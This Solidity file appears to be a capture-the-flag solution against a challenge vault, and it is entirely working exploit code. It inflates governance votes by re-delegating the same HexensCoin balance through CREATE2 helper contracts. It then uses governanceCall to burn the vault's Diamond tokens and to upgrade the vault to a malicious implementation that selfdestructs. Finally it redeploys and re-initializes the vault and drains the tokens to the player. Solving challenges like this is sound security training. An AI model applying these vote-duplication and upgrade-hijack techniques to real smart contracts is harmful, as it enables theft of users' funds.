// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Initializable} from "src/openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "src/openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {OwnableUpgradeable} from "src/openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import {IERC20} from "src/openzeppelin-contracts/interfaces/IERC20.sol";
import {Create2} from "src/openzeppelin-contracts/utils/Create2.sol";
import {Challenge} from "src/Challenge.sol";
import {Vault} from "src/Vault.sol";
import {VaultFactory} from "src/VaultFactory.sol";
import {HexensCoin} from "src/HexensCoin.sol";
import {Diamond} from "src/Diamond.sol";

contract DelegateHelper {
    function pwn(HexensCoin hexencoin, address recipient) external {
        hexencoin.delegate(msg.sender);
        hexencoin.transfer(recipient, hexencoin.balanceOf(address(this)));
    }
}

contract NewBurner {
    function rescueTokens(address token, address recipient) external {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    }
}

contract NewVault is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    Diamond diamond;
    HexensCoin hexensCoin;

    function initialize(address diamond_, address hexensCoin_) public initializer {
        __Ownable_init();
        diamond = Diamond(diamond_);
        hexensCoin = HexensCoin(hexensCoin_);
    }

    function rescueTokens(address token, address recipient) external {
        NewBurner burner = new NewBurner();
        burner.rescueTokens(token, recipient);
    }

    function destroy() external {
        selfdestruct(payable(msg.sender));
    }

    function _authorizeUpgrade(address) internal override view {
        require(msg.sender == owner());
    }
}

contract Exploit {
    Challenge internal challenge;
    VaultFactory internal vaultFactory;
    Vault internal vault;
    HexensCoin internal hexensCoin;
    Diamond internal diamond;

    address internal newVault;

    constructor(Challenge _challenge) {
        challenge = Challenge(_challenge);
        vaultFactory = challenge.vaultFactory();
        vault = challenge.vault();
        hexensCoin = challenge.hexensCoin();
        diamond = challenge.diamond();
        // Deploy NewVault
        newVault = address(new NewVault());
    }

    function pwn1() external {
        // 1. Claim free hexensCoin
        challenge.claim();
        // 2. Delegate to contract self
        hexensCoin.delegate(address(this));

        address newDelegateHelper = computeDelegateHelperAddress(bytes32(0));
        hexensCoin.transfer(newDelegateHelper, hexensCoin.balanceOf(address(this)));
        // 3. Loop to transfer hexensCoin to another address to delegate
        for (uint256 i; i < 9; ++i) {
            newDelegateHelper = computeDelegateHelperAddress(bytes32(i+1));
            DelegateHelper delegateHelper = DelegateHelper(deployDelegateHelper(bytes32(i)));
            delegateHelper.pwn(hexensCoin, newDelegateHelper);
        }

        // 4. Call `governanceCall` to burn
        bytes memory data = abi.encodeWithSignature("burn(address,uint256)", address(diamond), diamond.balanceOf(address(vault)));
        vault.governanceCall(data);

        // 5. Call `governanceCall` to upgrade vault to the NewVault implementation
        // and then destroy the vault
        bytes memory executionData = abi.encodeWithSignature("destroy()");
        data = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", newVault, executionData);
        vault.governanceCall(data);
    }

    // NOTICE: `selfdestruct` doesn't take effect until the call is over
    // So make two separate calls.
    function pwn2() external {
        // 6. Generate the vault again
        vaultFactory.createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));

        // 7. Initialize the vault again
        vault.initialize(address(diamond), address(hexensCoin));

        // 8. Upgrade the vault to NewVault
        vault.upgradeTo(newVault);

        // 9. Generate the burner again
        NewVault(address(vault)).rescueTokens(address(diamond), challenge.PLAYER());
    }

    function computeDelegateHelperAddress(bytes32 salt) internal view returns (address) {
        bytes memory bytecode = abi.encodePacked(type(DelegateHelper).creationCode);
        return Create2.computeAddress(salt, keccak256(bytecode));
    }

    function deployDelegateHelper(bytes32 salt) internal returns (address) {
        bytes memory bytecode = abi.encodePacked(type(DelegateHelper).creationCode);
        address deployedAddress = Create2.deploy(0, salt, bytecode);
        return deployedAddress;
    }
}
